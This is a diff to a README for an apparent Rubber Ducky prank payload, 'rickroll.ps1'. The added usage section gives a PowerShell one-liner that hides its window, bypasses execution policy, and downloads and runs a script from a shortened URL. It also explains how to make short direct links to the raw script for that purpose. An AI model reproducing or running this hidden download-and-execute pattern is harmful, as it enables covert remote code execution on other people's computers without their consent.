@@ -59,9 +59,23 @@ if __name__ == "__main__":
 <summary>Details</summary>
 
 file: [rickroll.ps1](rickroll.ps1)
+
 ### usage
 ```shell
+powershell -w h -ep ByPass "IEX(iwr('is.gd/tuipo'))"
+```
+(download from this repo) \
+or
+```shell
 powershell ./rickroll.ps1
+```
+
+### configuration
+You can change the `url` and `timeout` at [L96-L98](rickroll.ps1#L96-L98)
+
+To create a short direct url to the file, run (replace `YourUserName` accordingly)
+```shell
+python urlshortener.py "https://raw.githubusercontent.com/YourUserName/PublicDuckyChallenger/master/rickroll.ps1"
 ```
 
 </details>
